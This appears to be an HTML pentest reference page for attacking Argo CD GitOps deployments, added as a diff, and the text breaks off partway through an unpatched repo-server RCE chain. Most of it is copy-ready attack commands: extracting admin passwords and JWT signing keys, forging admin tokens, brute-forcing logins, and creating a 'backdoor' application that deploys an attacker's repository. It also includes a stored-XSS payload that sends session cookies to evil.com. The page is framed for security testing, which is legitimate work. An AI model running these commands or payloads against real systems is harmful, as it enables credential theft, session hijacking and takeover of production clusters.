@@ -1,0 +1,1725 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Argo CD Offensive Security Reference</title>
+<style>
+:root {
+  --bg: #0c0e12;
+  --bg-panel: #12151b;
+  --bg-card: #181c24;
+  --bg-code: #0d1017;
+  --border: #1e2330;
+  --border-active: #f97316;
+  --text: #c5cdd9;
+  --text-dim: #6b7a8d;
+  --text-bright: #e8ecf1;
+  --accent: #f97316;
+  --accent-dim: #f9731622;
+  --red: #ef4444;
+  --green: #22c55e;
+  --yellow: #eab308;
+  --blue: #3b82f6;
+  --purple: #a855f7;
+  --cyan: #06b6d4;
+  --sidebar-w: 280px;
+  --font-mono: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace;
+  --font-sans: -apple-system, BlinkMacSystemFont, 'Inter', sans-serif;
+}
+
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font-sans);
+  font-size: 14px;
+  line-height: 1.65;
+  display: flex;
+  height: 100vh;
+  overflow: hidden;
+}
+
+/* Sidebar */
+#sidebar {
+  width: var(--sidebar-w);
+  min-width: var(--sidebar-w);
+  background: var(--bg-panel);
+  border-right: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+}
+
+#sidebar-header {
+  padding: 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+#sidebar-header h1 {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--accent);
+  font-family: var(--font-mono);
+  letter-spacing: 0.5px;
+}
+
+#sidebar-header .subtitle {
+  font-size: 11px;
+  color: var(--text-dim);
+  margin-top: 4px;
+}
+
+#search-box {
+  padding: 10px 16px;
+  border-bottom: 1px solid var(--border);
+}
+
+#search-box input {
+  width: 100%;
+  background: var(--bg-code);
+  border: 1px solid var(--border);
+  color: var(--text);
+  padding: 7px 10px;
+  border-radius: 4px;
+  font-size: 12px;
+  font-family: var(--font-mono);
+  outline: none;
+}
+
+#search-box input:focus { border-color: var(--accent); }
+#search-box input::placeholder { color: var(--text-dim); }
+
+#nav-list {
+  flex: 1;
+  overflow-y: auto;
+  padding: 8px 0;
+}
+
+#nav-list::-webkit-scrollbar { width: 4px; }
+#nav-list::-webkit-scrollbar-track { background: transparent; }
+#nav-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+.nav-section {
+  padding: 6px 16px;
+  font-size: 10px;
+  font-weight: 700;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-top: 8px;
+}
+
+.nav-item {
+  padding: 6px 16px 6px 24px;
+  font-size: 12px;
+  color: var(--text-dim);
+  cursor: pointer;
+  transition: all 0.15s;
+  border-left: 2px solid transparent;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.nav-item:hover { color: var(--text); background: var(--bg-card); }
+.nav-item.active {
+  color: var(--accent);
+  border-left-color: var(--accent);
+  background: var(--accent-dim);
+}
+
+#sidebar-footer {
+  padding: 12px 16px;
+  border-top: 1px solid var(--border);
+  font-size: 11px;
+  color: var(--text-dim);
+  display: flex;
+  gap: 12px;
+}
+
+#sidebar-footer button {
+  background: none;
+  border: none;
+  color: var(--text-dim);
+  cursor: pointer;
+  font-size: 11px;
+  font-family: var(--font-sans);
+}
+
+#sidebar-footer button:hover { color: var(--accent); }
+
+/* Main Content */
+#main {
+  flex: 1;
+  overflow-y: auto;
+  padding: 32px 48px;
+}
+
+#main::-webkit-scrollbar { width: 6px; }
+#main::-webkit-scrollbar-track { background: transparent; }
+#main::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+.section { display: none; max-width: 900px; }
+.section.active { display: block; }
+
+.section h2 {
+  font-size: 20px;
+  font-weight: 700;
+  color: var(--text-bright);
+  margin-bottom: 8px;
+  padding-bottom: 8px;
+  border-bottom: 1px solid var(--border);
+}
+
+.section h3 {
+  font-size: 15px;
+  font-weight: 600;
+  color: var(--text-bright);
+  margin: 24px 0 10px;
+}
+
+.section h4 {
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--cyan);
+  margin: 16px 0 8px;
+  font-family: var(--font-mono);
+}
+
+.section p { margin-bottom: 12px; }
+
+.tag {
+  display: inline-block;
+  font-size: 10px;
+  font-weight: 600;
+  padding: 2px 7px;
+  border-radius: 3px;
+  font-family: var(--font-mono);
+  margin-right: 4px;
+  vertical-align: middle;
+}
+
+.tag-critical { background: #ef444433; color: var(--red); }
+.tag-high { background: #f9731633; color: var(--accent); }
+.tag-medium { background: #eab30833; color: var(--yellow); }
+.tag-info { background: #3b82f633; color: var(--blue); }
+.tag-unpatched { background: #a855f733; color: var(--purple); }
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  background: var(--bg-code);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  margin: 12px 0 16px;
+  overflow: hidden;
+}
+
+.code-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 6px 12px;
+  background: #0a0d12;
+  border-bottom: 1px solid var(--border);
+  font-size: 11px;
+  color: var(--text-dim);
+  font-family: var(--font-mono);
+}
+
+.code-header .lang { color: var(--cyan); }
+
+.copy-btn {
+  background: none;
+  border: 1px solid var(--border);
+  color: var(--text-dim);
+  padding: 2px 8px;
+  border-radius: 3px;
+  font-size: 10px;
+  cursor: pointer;
+  font-family: var(--font-mono);
+  transition: all 0.15s;
+}
+
+.copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+.copy-btn.copied { border-color: var(--green); color: var(--green); }
+
+.code-body {
+  padding: 12px 16px;
+  overflow-x: auto;
+  font-family: var(--font-mono);
+  font-size: 12.5px;
+  line-height: 1.7;
+  color: var(--text);
+  white-space: pre;
+}
+
+.code-body::-webkit-scrollbar { height: 4px; }
+.code-body::-webkit-scrollbar-track { background: transparent; }
+.code-body::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+/* Inline code */
+code {
+  font-family: var(--font-mono);
+  font-size: 12px;
+  background: var(--bg-code);
+  border: 1px solid var(--border);
+  padding: 1px 5px;
+  border-radius: 3px;
+  color: var(--cyan);
+}
+
+/* Tables */
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 12px 0 16px;
+  font-size: 13px;
+}
+
+th {
+  text-align: left;
+  padding: 8px 12px;
+  background: var(--bg-code);
+  border: 1px solid var(--border);
+  color: var(--text-bright);
+  font-weight: 600;
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+td {
+  padding: 8px 12px;
+  border: 1px solid var(--border);
+  vertical-align: top;
+}
+
+tr:hover td { background: #ffffff05; }
+
+/* Callout boxes */
+.callout {
+  border-left: 3px solid;
+  padding: 12px 16px;
+  margin: 12px 0 16px;
+  border-radius: 0 6px 6px 0;
+  font-size: 13px;
+}
+
+.callout-warn {
+  border-color: var(--yellow);
+  background: #eab30811;
+}
+
+.callout-danger {
+  border-color: var(--red);
+  background: #ef444411;
+}
+
+.callout-info {
+  border-color: var(--blue);
+  background: #3b82f611;
+}
+
+.callout-title {
+  font-weight: 600;
+  margin-bottom: 4px;
+  font-size: 12px;
+}
+
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-danger .callout-title { color: var(--red); }
+.callout-info .callout-title { color: var(--blue); }
+
+/* Notes textarea */
+.notes-area {
+  width: 100%;
+  min-height: 100px;
+  background: var(--bg-code);
+  border: 1px solid var(--border);
+  color: var(--text);
+  padding: 12px;
+  border-radius: 6px;
+  font-family: var(--font-mono);
+  font-size: 12px;
+  resize: vertical;
+  outline: none;
+  margin-top: 8px;
+}
+
+.notes-area:focus { border-color: var(--accent); }
+
+/* Attack chain flow */
+.attack-chain {
+  display: flex;
+  flex-direction: column;
+  gap: 0;
+  margin: 16px 0;
+}
+
+.chain-step {
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+  position: relative;
+  padding-left: 20px;
+  padding-bottom: 16px;
+}
+
+.chain-step::before {
+  content: '';
+  position: absolute;
+  left: 7px;
+  top: 20px;
+  bottom: 0;
+  width: 1px;
+  background: var(--border);
+}
+
+.chain-step:last-child::before { display: none; }
+
+.chain-num {
+  min-width: 16px;
+  height: 16px;
+  background: var(--accent);
+  color: var(--bg);
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 10px;
+  font-weight: 700;
+  position: absolute;
+  left: 0;
+  top: 2px;
+}
+
+.chain-text {
+  font-size: 13px;
+}
+
+.chain-text strong { color: var(--text-bright); }
+
+/* Checklist */
+.checklist { list-style: none; margin: 12px 0; }
+.checklist li {
+  padding: 6px 0;
+  display: flex;
+  align-items: flex-start;
+  gap: 8px;
+  font-size: 13px;
+}
+
+.checklist li::before {
+  content: '▸';
+  color: var(--accent);
+  font-weight: bold;
+  flex-shrink: 0;
+}
+
+/* MITRE mapping */
+.mitre-row {
+  display: grid;
+  grid-template-columns: 140px 1fr;
+  gap: 8px;
+  margin: 4px 0;
+  font-size: 12px;
+}
+
+.mitre-id {
+  font-family: var(--font-mono);
+  color: var(--purple);
+  font-weight: 600;
+}
+
+/* Mobile */
+@media (max-width: 768px) {
+  #sidebar { display: none; }
+  #main { padding: 16px; }
+}
+</style>
+</head>
+<body>
+
+<div id="sidebar">
+  <div id="sidebar-header">
+    <h1>ARGOCD PENTEST</h1>
+    <div class="subtitle">Offensive Security Reference</div>
+  </div>
+  <div id="search-box">
+    <input type="text" id="search" placeholder="Filter sections..." />
+  </div>
+  <div id="nav-list"></div>
+  <div id="sidebar-footer">
+    <button onclick="expandAll()">Expand All</button>
+    <button onclick="exportNotes()">Export Notes</button>
+    <button onclick="if(confirm('Clear all notes and progress?')){localStorage.removeItem('argocd-notes');location.reload();}">Reset</button>
+  </div>
+</div>
+
+<div id="main">
+<!-- ===================== SECTIONS ===================== -->
+
+<div class="section" id="sec-overview" data-nav="Overview" data-group="Foundations">
+<h2>Argo CD Architecture & Attack Surface</h2>
+
+<p>Argo CD is a Kubernetes-native GitOps continuous deployment controller. It watches Git repositories for desired state and reconciles that state into target clusters. Understanding its architecture is the foundation for every attack path.</p>
+
+<h3>Core Components</h3>
+<table>
+  <tr><th>Component</th><th>Default Port</th><th>Function</th><th>Attack Relevance</th></tr>
+  <tr><td><code>argocd-server</code></td><td>443 / 80 / 8080</td><td>API server, UI, gRPC gateway</td><td>Primary external attack surface. Handles authn, authz, session mgmt</td></tr>
+  <tr><td><code>argocd-repo-server</code></td><td>8081 (gRPC)</td><td>Clones repos, generates manifests via Helm/Kustomize</td><td>Unauthenticated internal gRPC. RCE via kustomize abuse. Access = cluster takeover</td></tr>
+  <tr><td><code>argocd-application-controller</code></td><td>8082</td><td>Reconciles desired vs live state. Applies manifests to clusters</td><td>Runs with cluster-admin by default. Controls what gets deployed</td></tr>
+  <tr><td><code>argocd-dex-server</code></td><td>5556 / 5557</td><td>OIDC/SSO identity broker</td><td>SSO bypass, token manipulation, OIDC misconfig</td></tr>
+  <tr><td><code>argocd-redis</code></td><td>6379</td><td>Caching layer for repo/app state</td><td>Cache poisoning → manifest injection. Often no TLS, weak/default auth</td></tr>
+  <tr><td><code>argocd-notifications-controller</code></td><td>—</td><td>Sends alerts on sync/health events</td><td>SSRF via webhook destinations, credential leakage in templates</td></tr>
+</table>
+
+<h3>Key Kubernetes Resources</h3>
+<table>
+  <tr><th>Resource</th><th>Namespace</th><th>What to Look For</th></tr>
+  <tr><td><code>Secret/argocd-secret</code></td><td>argocd</td><td>Admin bcrypt hash, server signing key, Dex secret, webhook secrets</td></tr>
+  <tr><td><code>Secret/argocd-initial-admin-secret</code></td><td>argocd</td><td>Initial admin password (often not deleted post-setup)</td></tr>
+  <tr><td><code>ConfigMap/argocd-cm</code></td><td>argocd</td><td>Local accounts, OIDC config, Dex config, resource exclusions, exec toggle</td></tr>
+  <tr><td><code>ConfigMap/argocd-rbac-cm</code></td><td>argocd</td><td>RBAC policies, default role, scopes</td></tr>
+  <tr><td><code>Secret/repo-*</code></td><td>argocd</td><td>Git/Helm repo credentials (user/pass, SSH keys, tokens)</td></tr>
+  <tr><td><code>Secret/cluster-*</code></td><td>argocd</td><td>External cluster kubeconfig / bearer tokens</td></tr>
+</table>
+
+<h3>Data Flow</h3>
+<div class="attack-chain">
+  <div class="chain-step"><span class="chain-num">1</span><div class="chain-text"><strong>Git Push</strong> → Webhook notifies argocd-server of new commit</div></div>
+  <div class="chain-step"><span class="chain-num">2</span><div class="chain-text"><strong>argocd-server</strong> → Tells repo-server to fetch + generate manifests</div></div>
+  <div class="chain-step"><span class="chain-num">3</span><div class="chain-text"><strong>argocd-repo-server</strong> → Clones repo, runs Helm/Kustomize, caches result in Redis</div></div>
+  <div class="chain-step"><span class="chain-num">4</span><div class="chain-text"><strong>argocd-application-controller</strong> → Compares cached desired state vs live cluster state</div></div>
+  <div class="chain-step"><span class="chain-num">5</span><div class="chain-text"><strong>Sync</strong> → Controller applies manifests to target cluster using stored credentials</div></div>
+</div>
+
+<div class="callout callout-danger">
+  <div class="callout-title">Why Argo CD is a Tier-Zero Target</div>
+  Argo CD concentrates Git repo credentials, cluster admin tokens, and deployment authority in one place. Compromise = control over what runs in production across all managed clusters.
+</div>
+</div>
+
+<!-- RECONNAISSANCE -->
+<div class="section" id="sec-recon" data-nav="Reconnaissance" data-group="Engagement Lifecycle">
+<h2>Reconnaissance</h2>
+
+<h3>External Discovery</h3>
+<h4>Identify Argo CD Instances</h4>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Shodan / Censys
+shodan search "argocd" --fields ip_str,port,org
+shodan search http.title:"Argo CD"
+shodan search http.favicon.hash:-1021781326
+
+# Certificate transparency
+curl -s "https://crt.sh/?q=%25argocd%25&output=json" | jq '.[].name_value' | sort -u
+
+# Google dorking
+# intitle:"Argo CD" inurl:"/applications"
+# intitle:"Argo CD" "Log in via" site:example.com
+
+# Nuclei template scan
+nuclei -u https://target.com -t http/technologies/argocd-detect.yaml</div></div>
+
+<h4>Fingerprint Version & Config</h4>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Version endpoint (unauthenticated)
+curl -sk https://argocd.target.com/api/version
+# Response: {"Version":"v2.13.3","BuildDate":"...","GitCommit":"..."}
+
+# Check if registration is enabled
+curl -sk https://argocd.target.com/api/v1/settings
+# Look for: userLoginsDisabled, dexConfig, oidcConfig, statusBadgeEnabled
+
+# Check Swagger UI exposure
+curl -sk https://argocd.target.com/swagger-ui/ -o /dev/null -w "%{http_code}"
+
+# Enumerate SSO/OIDC providers from login page
+curl -sk https://argocd.target.com/ | grep -i "dex\|oidc\|sso\|Log in via"</div></div>
+
+<h3>Internal / Post-Compromise Discovery</h3>
+<h4>Kubernetes-Side Enumeration</h4>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Find ArgoCD namespace and pods
+kubectl get ns | grep -i argo
+kubectl get pods -n argocd -o wide
+kubectl get svc -n argocd
+
+# Check what RBAC ArgoCD has on the cluster
+kubectl get clusterrolebinding | grep argocd
+kubectl describe clusterrolebinding argocd-application-controller
+kubectl describe clusterrolebinding argocd-server
+
+# List managed clusters
+kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=cluster
+kubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repository
+
+# Check for initial admin secret (often left behind)
+kubectl get secret argocd-initial-admin-secret -n argocd -o jsonpath='{.data.password}' | base64 -d
+
+# Check ConfigMaps for misconfig
+kubectl get cm argocd-cm -n argocd -o yaml
+kubectl get cm argocd-rbac-cm -n argocd -o yaml
+
+# Check if NetworkPolicies are in place
+kubectl get networkpolicy -n argocd</div></div>
+
+<h4>Network Reachability from Compromised Pod</h4>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Can we reach repo-server gRPC? (critical for RCE chain)
+nc -zv argocd-repo-server.argocd.svc.cluster.local 8081
+
+# Can we reach Redis?
+nc -zv argocd-redis.argocd.svc.cluster.local 6379
+
+# Can we reach the API server internally?
+curl -sk https://argocd-server.argocd.svc.cluster.local/api/version
+
+# DNS enumeration for ArgoCD services
+nslookup argocd-server.argocd.svc.cluster.local
+nslookup argocd-repo-server.argocd.svc.cluster.local
+nslookup argocd-redis.argocd.svc.cluster.local
+nslookup argocd-dex-server.argocd.svc.cluster.local</div></div>
+</div>
+
+<!-- AUTHENTICATION ATTACKS -->
+<div class="section" id="sec-authn" data-nav="Authentication Attacks" data-group="Engagement Lifecycle">
+<h2>Authentication Attacks</h2>
+
+<h3>Default & Weak Credentials</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Default admin password = name of the argocd-server pod
+# Retrieve initial admin password from secret (if accessible)
+kubectl get secret argocd-initial-admin-secret -n argocd \
+  -o jsonpath='{.data.password}' | base64 -d; echo
+
+# Login attempt via CLI
+argocd login argocd.target.com --insecure \
+  --username admin --password 'argocd-server-abcd1234'
+
+# Login attempt via API
+curl -sk https://argocd.target.com/api/v1/session \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin","password":"password"}'
+
+# Brute force (the API has no default rate limiting on /api/v1/session)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  argocd.target.com https-post-form \
+  "/api/v1/session:username=^USER^&password=^PASS^:Invalid"</div></div>
+
+<h3>JWT Token Analysis</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># ArgoCD issues JWTs signed with server.secretkey from argocd-secret
+# Decode a captured token
+echo "$ARGOCD_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq .
+# Look for: iss (argocd), sub (user/account), iat, exp, groups
+
+# If you have K8s secret access, extract the signing key
+kubectl get secret argocd-secret -n argocd \
+  -o jsonpath='{.data.server\.secretkey}' | base64 -d
+
+# Forge tokens with the signing key (python-jose / PyJWT)
+python3 -c "
+import jwt, time
+key = 'EXTRACTED_SECRET_KEY'
+payload = {
+    'iss': 'argocd',
+    'sub': 'admin',
+    'iat': int(time.time()),
+    'nbf': int(time.time()),
+    'exp': int(time.time()) + 86400
+}
+print(jwt.encode(payload, key, algorithm='HS256'))
+"
+
+# Test forged token
+curl -sk https://argocd.target.com/api/v1/applications \
+  -H "Authorization: Bearer $FORGED_TOKEN"</div></div>
+
+<h3>SSO/OIDC Exploitation</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Check Dex config for misconfigurations
+kubectl get cm argocd-cm -n argocd -o jsonpath='{.data.dex\.config}' | yq .
+# Look for: static clients with known secrets, enablePasswordDB, staticPasswords
+
+# Dex static password hashes (if configured)
+# Check for bcrypt hashes in dex.config staticPasswords section
+
+# OIDC redirect_uri manipulation
+# If allowedRedirectURIs is misconfigured:
+https://argocd.target.com/auth/callback?redirect_uri=https://evil.com/steal
+
+# Dex connectors may expose LDAP/AD configs with bind credentials
+# Look in dex.config → connectors → config → bindDN, bindPW</div></div>
+
+<h3>Account Enumeration</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Enumerate local accounts from ConfigMap
+kubectl get cm argocd-cm -n argocd -o yaml | grep "accounts\."
+# Format: accounts.<name>: apiKey,login
+
+# List accounts via CLI (requires auth)
+argocd account list
+
+# Via API
+curl -sk https://argocd.target.com/api/v1/account \
+  -H "Authorization: Bearer $TOKEN" | jq '.items[].name'
+
+# Generate API key for a service account (priv esc if you have account perms)
+argocd account generate-token --account <account-name></div></div>
+
+<div class="callout callout-warn">
+  <div class="callout-title">User Enumeration (CVE-2020-8827)</div>
+  Versions before v1.5.1 allowed timing-based user enumeration on the login endpoint. The API returned different response times for valid vs invalid usernames.
+</div>
+</div>
+
+<!-- RBAC EXPLOITATION -->
+<div class="section" id="sec-rbac" data-nav="RBAC & Authorization" data-group="Engagement Lifecycle">
+<h2>RBAC & Authorization Exploitation</h2>
+
+<h3>Understanding ArgoCD RBAC</h3>
+<p>ArgoCD uses a Casbin-based RBAC engine configured in <code>argocd-rbac-cm</code>. Policies follow the format: <code>p, &lt;role&gt;, &lt;resource&gt;, &lt;action&gt;, &lt;object&gt;, &lt;effect&gt;</code></p>
+
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Dump RBAC policy
+kubectl get cm argocd-rbac-cm -n argocd -o yaml
+
+# Key fields:
+# policy.default: role:readonly    ← default role for authenticated users
+# policy.csv: |                    ← custom policies
+#   p, role:developer, applications, sync, */*, allow
+#   g, my-team, role:developer
+
+# Check if default role is overly permissive
+kubectl get cm argocd-rbac-cm -n argocd \
+  -o jsonpath='{.data.policy\.default}'
+# Dangerous values: role:admin, or no policy.default (falls back to '')
+
+# Check scopes - which JWT claim is used for group mapping
+kubectl get cm argocd-rbac-cm -n argocd \
+  -o jsonpath='{.data.scopes}'
+# Default: '[groups]' — controls which OIDC claim feeds into RBAC</div></div>
+
+<h3>Common RBAC Misconfigurations</h3>
+<table>
+  <tr><th>Misconfiguration</th><th>Impact</th><th>Detection</th></tr>
+  <tr><td><code>policy.default: role:admin</code></td><td>Any authenticated user is admin</td><td>Check argocd-rbac-cm</td></tr>
+  <tr><td>No <code>policy.default</code> set</td><td>May grant no perms or fall through to built-in admin</td><td>Verify with test account</td></tr>
+  <tr><td><code>p, role:x, *, *, *, allow</code></td><td>Wildcard policy grants everything</td><td>Parse policy.csv for wildcards</td></tr>
+  <tr><td><code>applications, create</code> on <code>*/*</code></td><td>Create apps in any project/namespace → deploy anything</td><td>Test with project-scoped token</td></tr>
+  <tr><td><code>exec</code> action enabled</td><td>Interactive shell into managed pods</td><td>Check argocd-cm for <code>exec.enabled: "true"</code></td></tr>
+  <tr><td>Scopes misconfigured</td><td>Group claims ignored, everyone gets default role</td><td>Decode JWT, compare groups claim vs policy</td></tr>
+</table>
+
+<h3>Privilege Escalation via Projects</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># List projects and their permissions
+argocd proj list
+argocd proj get <project-name> -o yaml
+
+# Look for projects with:
+# - spec.destinations: [{server: '*', namespace: '*'}]  ← deploy anywhere
+# - spec.sourceRepos: ['*']                             ← any git repo
+# - spec.clusterResourceWhitelist: [{group: '*', kind: '*'}]  ← create cluster-scoped resources
+
+# Generate project-scoped token (if you have projects, get or roles perms)
+argocd proj role create-token <project> <role-name>
+
+# CVE-2025-55190: Project token leaks ALL repo credentials
+# If you have a project token with basic 'get' permissions:
+curl -sk https://argocd.target.com/api/v1/projects/<project>/detailed \
+  -H "Authorization: Bearer $PROJECT_TOKEN" | jq '.project.spec.sourceRepos, .repositoryCredentials'</div></div>
+
+<h3>Exec Into Managed Pods</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Check if exec is enabled
+kubectl get cm argocd-cm -n argocd -o jsonpath='{.data.exec\.enabled}'
+
+# If exec.enabled: "true" and you have applications/exec permission:
+argocd app exec <app-name> -- /bin/sh
+
+# Via API (WebSocket upgrade)
+# POST /api/v1/applications/{app}/pods/{pod}/exec
+# This gives you a shell in any pod Argo CD manages</div></div>
+</div>
+
+<!-- API EXPLOITATION -->
+<div class="section" id="sec-api" data-nav="API Exploitation" data-group="Engagement Lifecycle">
+<h2>API Server Exploitation</h2>
+
+<h3>API Endpoint Reference</h3>
+<table>
+  <tr><th>Endpoint</th><th>Auth</th><th>Use Case</th></tr>
+  <tr><td><code>GET /api/version</code></td><td>No</td><td>Version fingerprinting</td></tr>
+  <tr><td><code>GET /api/v1/settings</code></td><td>No</td><td>SSO config, features enabled</td></tr>
+  <tr><td><code>POST /api/v1/session</code></td><td>No</td><td>Login, credential brute force</td></tr>
+  <tr><td><code>GET /api/v1/applications</code></td><td>Yes</td><td>List all apps, deployment config</td></tr>
+  <tr><td><code>GET /api/v1/repositories</code></td><td>Yes</td><td>List connected repos + creds</td></tr>
+  <tr><td><code>GET /api/v1/clusters</code></td><td>Yes</td><td>List managed clusters + server URLs</td></tr>
+  <tr><td><code>GET /api/v1/projects/{name}/detailed</code></td><td>Yes</td><td>Project details (CVE-2025-55190 cred leak)</td></tr>
+  <tr><td><code>GET /api/v1/account</code></td><td>Yes</td><td>Enumerate accounts</td></tr>
+  <tr><td><code>POST /api/v1/applications</code></td><td>Yes</td><td>Create application (deploy workload)</td></tr>
+  <tr><td><code>POST /api/v1/applications/{name}/sync</code></td><td>Yes</td><td>Force sync / deploy</td></tr>
+  <tr><td><code>GET /swagger-ui/</code></td><td>No</td><td>Full API documentation if exposed</td></tr>
+</table>
+
+<h3>Credential & Secret Extraction</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># List repositories with credentials
+curl -sk https://argocd.target.com/api/v1/repositories \
+  -H "Authorization: Bearer $TOKEN" | jq '.items[] | {repo: .repo, username: .username}'
+
+# List cluster credentials
+curl -sk https://argocd.target.com/api/v1/clusters \
+  -H "Authorization: Bearer $TOKEN" | jq '.items[] | {server: .server, name: .name}'
+
+# CVE-2025-55190: Extract repo creds via project detailed endpoint
+# Any token with projects,get can access this
+curl -sk "https://argocd.target.com/api/v1/projects/default/detailed" \
+  -H "Authorization: Bearer $TOKEN" | jq '.repositoryCredentials'
+
+# CVE-2026-42880 (ServerSideDiff secret extraction)
+# Read-only users can extract K8s secrets via the diff/comparison API
+# Check if compare-options annotation is set on applications:
+curl -sk "https://argocd.target.com/api/v1/applications/<app>" \
+  -H "Authorization: Bearer $TOKEN" | \
+  jq '.metadata.annotations["argocd.argoproj.io/compare-options"]'</div></div>
+
+<h3>Application Manipulation</h3>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Create a malicious application pointing to attacker-controlled repo
+curl -sk https://argocd.target.com/api/v1/applications \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+  "metadata": {"name": "backdoor"},
+  "spec": {
+    "project": "default",
+    "source": {
+      "repoURL": "https://github.com/attacker/malicious-manifests",
+      "path": ".",
+      "targetRevision": "main"
+    },
+    "destination": {
+      "server": "https://kubernetes.default.svc",
+      "namespace": "kube-system"
+    },
+    "syncPolicy": {
+      "automated": {"prune": true, "selfHeal": true}
+    }
+  }
+}'
+
+# Modify existing application source
+curl -sk -X PUT https://argocd.target.com/api/v1/applications/<app> \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"spec":{"source":{"repoURL":"https://github.com/attacker/repo"}}}'
+
+# Force sync
+curl -sk -X POST \
+  "https://argocd.target.com/api/v1/applications/<app>/sync" \
+  -H "Authorization: Bearer $TOKEN"</div></div>
+
+<h3>Stored XSS (GHSA-h98r-wv3h-fr38)</h3>
+<div class="callout callout-danger">
+  <div class="callout-title">Developer-to-Admin Privilege Escalation via XSS</div>
+  Application link annotations can contain stored XSS payloads. A developer with <code>applications, update</code> can inject JavaScript that executes when an admin views the app in the UI, stealing their session token.
+</div>
+<div class="code-block"><div class="code-header"><span class="lang">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div><div class="code-body"># Inject XSS via application annotations (requires update permission)
+argocd app set <app-name> --annotations \
+  "notifications.argoproj.io/subscribe.on-sync-succeeded.slack=x](&quot;javascript:fetch('https://evil.com/steal?t='+document.cookie)//)"</div></div>
+</div>
+
+<!-- REPO SERVER RCE -->
+<div class="section" id="sec-reposerver" data-nav="Repo-Server RCE" data-group="Exploitation">
+<h2>Repo-Server RCE (Unpatched)</h2>
+<p><span class="tag tag-critical">CRITICAL</span> <span class="tag tag-unpatched">UNPATCHED</span> Synacktiv disclosure, July 2026. No CVE assigned. No fix available.</p>
+
+<h3>Attack Overview</h3>
+<p>The <code>argocd-repo-server</code> exposes an internal gRPC service (<code>GenerateManifest</code>) with no authentication. Anyone who can reach port 8081 can send a crafted request that abuses Kustomize's <code>--helm-command</code> option to execute arbitrary commands.</p>
+
+<h3>Prerequisites</h3>
+<ul class="checklist">
+  <li>Network access to repo-server on port 8081 (from compromised pod, CI job, misconfigured service mesh, or exposed service)</li>
+  <li>Network access to Redis on port 6379 (for cache poisoning phase)</li>
+  <li>The target Argo CD instance uses Kustomize (very common)</li>
+</ul>
+
+<h3>Attack Chain</h3>
+<div class="attack-chain">
+  <div class="chain-step"><span class="chain-num">1</span><div class="chain-text"><strong>Reach repo-server gRPC (8081)</strong> — From compromised pod in same cluster. No auth required.</div></div>
+  <div class="chain-step"><span class="chain-num">2</span><div class="chain-text"><strong>Send crafted GenerateManifest request</strong> — Set Kustomize options with <code>--enable-helm --helm-command /path/to/script</code> pointing to attacker-controlled Git repo.</div></div>
+  <div class="chain-step"><span class="chain-num">3</span><div class="chain-text"><strong>Kustomize executes attacker script</strong> — Instead of invoking Helm, it runs the malicious script from the cloned repo.</div></div>
+  <div class="chain-step"><span class="chain-num">4</span><div class="chain-text"><strong>Read REDIS_PASSWORD from environment</strong> — The repo-server pod has this env var set. <code>env | grep REDIS</code></div></div>
